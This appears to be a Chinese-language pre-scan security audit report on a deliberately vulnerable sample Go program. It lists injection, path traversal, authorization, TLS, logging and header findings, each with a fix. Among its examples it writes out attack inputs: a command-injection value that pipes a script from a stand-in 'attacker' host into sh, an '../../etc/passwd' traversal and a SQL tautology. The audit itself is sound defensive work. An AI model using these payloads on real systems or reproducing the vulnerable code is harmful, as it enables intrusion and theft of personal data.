# 源碼稽核發現清單

- 稽核對象：`security-compliance-tw/testdata/sample-go`（`main.go` 41 行、`go.mod`）
- 模式：模式 1（送掃之前）
- 日期：2026-08-22（第二輪；本檔取代第一輪版本）
- 技術棧：Go 1.22，僅標準函式庫

## Profile 與假設

| 項目 | 值 | 判定來源 |
|---|---|---|
| 安全分級 | **中（假設）** | 使用者答「不確定」。依 `profile.md` 以「中」進行並註明；核定為「高」時全表優先序上移一級，且需另加 MFA、靜態加密、滲透測試等項目 |
| 對外提供服務 | 是 | 使用者回答 |
| 有 API 端點 | 否 | 使用者未勾選；三支 handler 回傳純文字與檔案位元組 |
| 有 LLM / RAG / Agent | 否 | 使用者未勾選 |
| **處理個資或金流** | **是** | 使用者回答。程式中 `users` 資料表查詢即為個資存取點 |
| 有登入功能 | 否 | **由程式碼判定**（依 `profile.md` 規定不問使用者）：全檔無 session / cookie / JWT / 密碼處理，`grep` 驗證無命中 |
| 預期掃描器 | 商用 SAST + 開源 SAST + DAST 三類全上 | 使用者回答。下方每項均列出三類的預期標記 |

### 載入的 check 集合

| 條件 | 載入 |
|---|---|
| 一律 | `sast-injection`、`sast-errors` |
| 對外服務 | `dast-headers`、`dast-tls-cookie`、`dast-info-leak` |
| 分級 ≥ 中 | `sast-authz`、`sast-crypto` |
| 個資／金流 | `sast-logging`、`sast-crypto` |

未載入：`sast-session-auth`（無登入功能）、`sast-api-authz`（無 API 端點）、`sast-llm`（無相關功能）。

分級「中」故**不列入**下列僅高等級要求的項目，避免不適用雜訊：
多重因素身分鑑別、備援高可用性架構、滲透測試、機敏資料靜態加密、
重要紀錄留存雜湊值、通信流量自動化監控、稽核失效即時告警。

## 判定總表

| # | check-id | 位置 | 判定 | 優先序 | 處置 |
|---|---|---|---|---|---|
| 1 | SAST-INJ-001 | [main.go:16](../security-compliance-tw/testdata/sample-go/main.go#L16) | 真漏洞 | P0 | 驅動層 placeholder |
| 2 | SAST-INJ-002 | [main.go:25](../security-compliance-tw/testdata/sample-go/main.go#L25) | 真漏洞 | P0 | 不經 shell，argv 逐一傳入 |
| 3 | SAST-INJ-003 | [main.go:30](../security-compliance-tw/testdata/sample-go/main.go#L30) | 真漏洞 | P0 | 正規化 → 前綴比對 → 才開檔 |
| 4 | SAST-AUTHZ-001 | 三支 handler | 真漏洞 | P0 | 需求層決策，見該節 |
| 5 | DAST-TLS-001 | [main.go:39](../security-compliance-tw/testdata/sample-go/main.go#L39) | 真問題 | **P0** | 改 TLS；個資明文傳輸，較第一輪升級 |
| 6 | **SAST-LOG-003** | 全檔 | **真問題** | **P1** | 補集中式稽核 API 與四類事件 |
| 7 | SAST-ERR-002 | 17 / 25 / 30 / 39 | 真漏洞 | P2 | `if err := ...; err != nil` |
| 8 | DAST-HDR-001 | [main.go:35](../security-compliance-tw/testdata/sample-go/main.go#L35) | 真問題 | P2 | 安全標頭 middleware |
| 9 | DAST-HDR-002 | 同上 | 真問題 | P2 | 同一 middleware |
| 10 | DAST-HDR-003 | 同上 | 真問題 | P2 | 同一 middleware |

誤判：**0 筆**。詳見 `false-positives.md`。

### 與第一輪的差異

第一輪的問答漏了「是否處理個資或金流」，因此未載入 `sast-logging.md`。
本輪補上後有兩處變動：

- **新增第 6 項 SAST-LOG-003**（稽核事件完全缺席）——這一項**沒有任何掃描器
  會報**，只會在人工複核與稽核抽查時被要求補件
- **第 5 項 DAST-TLS-001 由 P1 升為 P0**——確認處理個資後，
  純 HTTP 傳輸即為個資明文傳輸

---

## 1 · SAST-INJ-001 SQL 指令注入 — 真漏洞 P0

**位置**：`main.go:15-17`

```go
name := r.URL.Query().Get("name")
q := "SELECT * FROM users WHERE name = '" + name + "'"
rows, _ := db.Query(q)
```

**判定理由**：`name` 直接來自 HTTP query string，未經白名單映射，未走驅動層
placeholder。誤判三要件第 1、2 條皆不成立。
本輪確認 `users` 表含個資，`' OR '1'='1` 即可取出全表個資，衝擊高於第一輪評估。

**掃描器預期**：

| 類別 | 規則 | 等級 |
|---|---|---|
| 商用 SAST | Fortify `SQL Injection` / Checkmarx `SQL_Injection` | Critical / High |
| 開源 SAST | gosec G202、SonarQube S3649、Semgrep `string-formatted-query` | HIGH / Blocker / ERROR |
| DAST | AWVS / ZAP `SQL Injection` | High |

Fortify 判 Critical，依優先序表任一分級皆為 P0。

**過關寫法**：`db.Query("SELECT id, name FROM users WHERE name = ?", name)`

---

## 2 · SAST-INJ-002 作業系統命令注入 — 真漏洞 P0

**位置**：`main.go:24-25`

```go
exec.Command("sh", "-c", "convert "+f+" out.png").Run()
```

**判定理由**：外部輸入串接進命令字串**且**透過 `sh -c` 執行，
符合真漏洞準則第一條。`?file=x;curl attacker/s|sh` 即為任意命令執行。

**掃描器預期**：Fortify `Command Injection` Critical、Checkmarx `Command_Injection` High、
gosec G204 HIGH、SonarQube S2076 Blocker、Semgrep `command-injection` ERROR、
AWVS / ZAP `OS Command Injection` High。

**過關寫法**：`exec.Command("convert", target, "out.png")`——不經 shell，
檔名另需套用第 3 項的根目錄限制。

---

## 3 · SAST-INJ-003 路徑尋訪 — 真漏洞 P0

**位置**：`main.go:30`

```go
data, _ := os.ReadFile("/var/data/" + r.URL.Query().Get("file"))
```

**判定理由**：開檔路徑含外部輸入，開檔前完全沒有根目錄前綴比對，
且讀出的內容直接回寫給客戶端。`?file=../../etc/passwd` 即可讀取任意檔案。

**掃描器預期**：Fortify `Path Manipulation` Critical、Checkmarx `Path_Traversal` High、
gosec G304 MEDIUM、SonarQube S2083 Blocker、AWVS / ZAP `Directory Traversal` High。

**過關寫法**：固定三步，順序不可顛倒。

```go
root := "/var/data"
target := filepath.Join(root, filepath.Clean("/"+userInput))
if !strings.HasPrefix(target, filepath.Clean(root)+string(os.PathSeparator)) {
	http.Error(w, "forbidden", http.StatusForbidden)
	return
}
```

---

## 4 · SAST-AUTHZ-001 存取資源前未執行授權檢查 — 真漏洞 P0

**位置**：`main.go:14`、`:23`、`:29`（三支 handler 全部）

**判定理由**：依 check 的判定方式——找出這支 API 的授權決策點，
找不到任何一行在做決策即為真漏洞。三支 handler 內沒有任何身分或權限判斷。
本輪確認處理個資後，`/user` 屬未授權個資查詢介面。

**掃描器預期**：Fortify `Access Control: Database` Critical（`users` 查詢鍵值來自請求，
查詢條件中無任何可回溯到 session 的值）、SonarQube S5808 Blocker。
**gosec 與 bandit 不涵蓋授權語意，本地跑開源工具乾淨不代表這項過關**；
DAST 端 ZAP 的 Access Control Testing 需設定兩組不同權限帳號才驗得出來。

**處置說明**：無法只靠改寫程式碼結案——專案沒有任何身分機制。屬需求層決策：

- 若端點**應受保護**：先導入身分機制，再建立單一具名授權入口
  `authz.Require`，並在查詢中帶入 session 身分
  （`WHERE name = ? AND owner_id = ?`）——這才是消掉 Fortify
  `Access Control: Database` 的關鍵結構
- 若端點**本應公開**：`/user` 需改為只回傳白名單欄位，且既然涉及個資，
  公開查詢介面本身需要有法源依據；`/file` 與 `/convert` 無論如何都不該公開

---

## 5 · DAST-TLS-001 傳輸未加密 — 真問題 P0（第一輪為 P1）

**位置**：`main.go:39`

```go
http.ListenAndServe(":8080", nil)
```

**判定理由**：本 check 的準則針對 TLS 版本與加密套件，本案是更根本的情形——
對外服務**完全沒有 TLS**。個資經純 HTTP 傳輸，且附表十對普／中／高三級
一律要求「身分鑑別資訊不以明文傳輸」。DAST-HDR-002（HSTS）在純 HTTP 下
亦無從成立。

**優先序說明**：第一輪評 P1（Nessus / AWVS 明文傳輸多為 Medium–High）。
本輪確認處理個資，個資明文傳輸屬送掃前必修，提升為 P0。

**過關寫法**：

```go
srv := &http.Server{
	Addr:    ":8443",
	Handler: securityHeaders(mux),
	TLSConfig: &tls.Config{
		MinVersion:   tls.VersionTLS12,
		CipherSuites: []uint16{ /* 明列 AEAD 套件，勿用 ALL / HIGH */ },
	},
}
srv.ListenAndServeTLS(certFile, keyFile)
```

TLS 若由負載平衡器終結，**改在 LB 設定**，佐證註明實際生效位置——
改應用程式端的 `tls.Config` 對複掃結果不會有任何影響。

---

## 6 · SAST-LOG-003 缺少必要的稽核事件記錄 — 真問題 P1（本輪新增）

**位置**：全檔。`grep -nE "log\.|slog|Audit|..."` 對 `main.go` 無任何命中，
程式中不存在任何日誌或稽核寫入。

**判定理由**：check 的判定準則為——身分鑑別失敗、授權被拒、
重要資料新增修改刪除、管理者行為四類事件中，任一類在源碼中找不到
對應的稽核寫入呼叫即為真問題。本案四類**全部**沒有。
第 7 項（錯誤回傳值未檢查）使失敗路徑連錯誤都不可觀測，兩者相互加重。

**掃描器預期**：**無**。Fortify、Checkmarx、Semgrep、SonarQube、CodeQL、
gosec、bandit 都沒有現成規則；DAST 更不可能從外部觀測到日誌內容。
這一項只會在**人工複核與稽核抽查**時被要求補件，屆時通常已來不及。

**優先序說明**：無掃描器等級可套用優先序表。評為 P1 的依據是附表十對
普／中／高三個分級**一律要求**記錄身分鑑別失敗、存取資源失敗、
重要資料異動與管理者行為，且本案處理個資。

**過關寫法**：集中式稽核進入點，五要素固定。

```go
type AuditEvent struct {
	UserID   string    `json:"user_id"`   // 系統內部代碼，不可為身分證號等個資型態
	At       time.Time `json:"at"`        // 經 NTP 校時，RFC3339 含時區
	Resource string    `json:"resource"`  // 執行的功能或存取的資源
	Type     string    `json:"type"`      // AUTH_FAIL / ACCESS_DENIED / DATA_CHANGE / ADMIN_ACTION
	Level    string    `json:"level"`
	Detail   string    `json:"detail"`
}

func Audit(ctx context.Context, e AuditEvent) { /* 寫入稽核儲存 */ }
```

補稽核紀錄時會連帶觸發 SAST-LOG-001（Log Forging）——稽核必然要記
使用者輸入。處置是先過 `sanitizeForLog`（轉義 `\n` `\r` `\x1b` 並截長），
**不可以因為掃描器標紅就把稽核紀錄拿掉**。

---

## 7 · SAST-ERR-002 錯誤回傳值未檢查 — 真漏洞 P2

**位置**：`main.go:17`、`:25`、`:30`、`:39`

```go
rows, _ := db.Query(q)            // 17：err 丟棄；rows 為 nil 時下一行直接 panic
defer rows.Close()                // 18
exec.Command(...).Run()           // 25：回傳值整個丟棄
data, _ := os.ReadFile(...)       // 30：讀檔失敗仍 w.Write(data)
http.ListenAndServe(":8080", nil) // 39：綁定失敗程序靜默結束
```

**判定理由**：符合真漏洞準則第二條——錯誤被吞掉且沒有任何日誌，
失敗完全不可觀測。第 17 行另有實質後果：`db.Query` 失敗時 `rows` 為 `nil`，
第 18 行的 `rows.Close()` 會 panic，成為可由外部觸發的可用性問題。

**優先序說明**：掃描器等級為 Low（gosec G104 / Fortify Poor Error Handling），
依表在分級「中」屬 P3；此處提升為 P2，理由是第 17 行已構成可遠端觸發的 panic。

**掃描器預期**：Fortify `Poor Error Handling: Return Value Ignored` Low、
gosec G104 LOW、errcheck（`-blank` 另抓 `_ =`）。
註：改成 `_ =` 不是解法，errcheck `-blank` 與 Fortify 照樣標記。

**過關寫法**：

```go
rows, err := db.Query("SELECT id, name FROM users WHERE name = ?", name)
if err != nil {
	log.Printf("query users failed: %v", err) // err 只流向日誌
	http.Error(w, "internal server error", http.StatusInternalServerError)
	return
}
defer rows.Close()
```

---

## 8-10 · DAST-HDR-001 / 002 / 003 安全標頭全缺 — 真問題 P2

**位置**：`main.go:35-39`（`main`，未掛任何 middleware）

**判定理由**：三支 handler 直接註冊到 `http.DefaultServeMux`，
回應不會出現 `Content-Security-Policy`、`Strict-Transport-Security`、
`X-Frame-Options` 任何一項。`/file` 會回傳任意檔案內容（可能含 HTML），
因此 CSP 與 frame-ancestors 為真問題，不適用「純 API 網域可略」的論點。

**掃描器預期**（皆 Medium，分級「中」對應 P2）：
AWVS `Content Security Policy not implemented` / `HSTS not enabled` /
`Clickjacking: X-Frame-Options header missing`；
ZAP `CSP Header Not Set` / `Strict-Transport-Security Header Not Set` /
`Missing Anti-clickjacking Header`；Nessus 與 WebInspect 有對應規則。
商用與開源 SAST 對此類無對應規則。

**過關寫法**：集中在一個 middleware 一次設完，包在 mux 外層涵蓋所有路由——
散在各 handler 必漏，DAST 只要掃到一條沒有標頭的路徑就成立。

```go
func securityHeaders(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Security-Policy",
			"default-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'")
		w.Header().Set("Strict-Transport-Security", "max-age=31536000; includeSubDomains")
		w.Header().Set("X-Frame-Options", "DENY")
		next.ServeHTTP(w, r)
	})
}
```

`X-Frame-Options` 與 CSP `frame-ancestors` 兩者都設——舊掃描器只認前者。
HSTS 必須搭配第 5 項改用 HTTPS 才會實際生效。

---

## 未命中與不適用

| check-id | 判定 | 理由 |
|---|---|---|
| SAST-LOG-001 | 未命中 | 全檔無日誌 sink，無外部輸入進入日誌 API。**補完第 6 項後必然出現，屆時需同步套用 sanitize** |
| SAST-LOG-002 | 未命中 | 同上；目前無任何日誌敘述可外洩個資 |
| SAST-LOG-004 | 不適用 | 無 `os.OpenFile` / `WriteFile` / `Chmod`，程式不自行落地日誌檔 |
| SAST-ERR-001 | 未命中 | 回應主體僅有常數 `"ok"` 與檔案內容，無 `err.Error()` 流向回應 |
| SAST-ERR-003 | 未命中 | `rows.Close()` 已在 `defer`（結構正確）；其錯誤路徑問題歸第 7 項 |
| SAST-ERR-004 | 未命中 | Go 無例外機制；無 `recover()` 全吞樣式 |
| SAST-AUTHZ-002 | 不適用 | 無擁有者概念可比對；根因同第 4 項，修補後需重評 |
| SAST-AUTHZ-003 | 未命中 | 無角色判斷、無整包綁定（mass assignment）樣式 |
| SAST-AUTHZ-004 | 未命中 | 無權限位元設定、無 Dockerfile |
| SAST-CRYPTO-001~004 | 不適用 | 全檔無 `crypto/*`、`math/rand`、雜湊或 TLS 用戶端呼叫（grep 驗證）。註：個資**靜態**加密屬僅高等級要求，分級「中」不列入 |
| DAST-COOKIE-001~003 | 不適用 | 無 `http.SetCookie`，不會產生 `Set-Cookie` |
| DAST-LEAK-001 | 未命中 | 無 debug 模式、無自製 recover 寫堆疊；Go 標準庫 panic 不將堆疊送往客戶端 |
| DAST-LEAK-002 | 未命中 | 無 `http.FileServer`（`/file` 為自製 handler，問題歸第 3 項） |
| DAST-LEAK-003 | 未命中 | Go 標準庫預設不送 `Server` 標頭，程式未手動加版本標頭 |
| DAST-LEAK-004 | 未命中 | 無靜態檔案掛載；部署層（`.dockerignore`、反向代理）不在本次範圍 |

## 本知識庫尚未涵蓋

以下項目**未**檢查，不在 42 則 check 範圍內，需另循管道處理：
備份備援、稽核儲存容量、時戳校時、系統文件、委外管理、供應鏈完整性、
基礎設施加固（GCB / 防火牆 / OS）。

其中**稽核儲存容量**與**時戳校時**與第 6 項直接相關——
補了稽核事件之後，紀錄的保存期限、儲存容量告警與 NTP 校時仍需另行處理，
本知識庫不提供這三項的判定依據。

需要附表十勾稽表、源碼安全查檢表或安全測試報告時，改用 `sec-deliverables`，
它會讀取本檔作為輸入。
